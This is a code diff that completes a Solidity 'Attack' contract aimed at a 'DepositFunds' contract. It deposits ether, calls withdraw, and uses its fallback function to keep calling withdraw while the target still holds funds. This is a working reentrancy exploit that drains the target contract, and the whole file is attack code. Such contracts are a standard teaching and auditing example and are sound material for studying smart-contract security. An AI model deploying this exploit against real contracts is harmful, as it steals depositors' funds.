@@ -1,10 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-// Attack function: initiate attack by first depositing and then withdrawing
+interface IDepositFunds {
+    function deposit() external payable;
+    function withdraw() external;
+}
 
-function attack() external payable 
+contract Attack {
+    IDepositFunds public depositFunds;
 
-require(msg.value >= 1 ether, "Minimum attack deposit is 1 ether");
+    constructor(address _depositFundsAddress) {
+        depositFunds = IDepositFunds(_depositFundsAddress);
+    }
 
-depositFunds.deposit(value: msg.value)();
+    // Attack function: deposit Ether, then withdraw to exploit reentrancy
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Minimum attack deposit is 1 ether");
 
-depositFunds.withdraw();}
+        // Deposit Ether into the vulnerable contract
+        depositFunds.deposit{value: msg.value}();
+
+        // Trigger withdraw to exploit
+        depositFunds.withdraw();
+    }
+
+    // Fallback: gets called when vulnerable contract sends Ether back
+    fallback() external payable {
+        if (address(depositFunds).balance >= 1 ether) {
+            depositFunds.withdraw();
+        }
+    }
+
+    // Helper: check balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
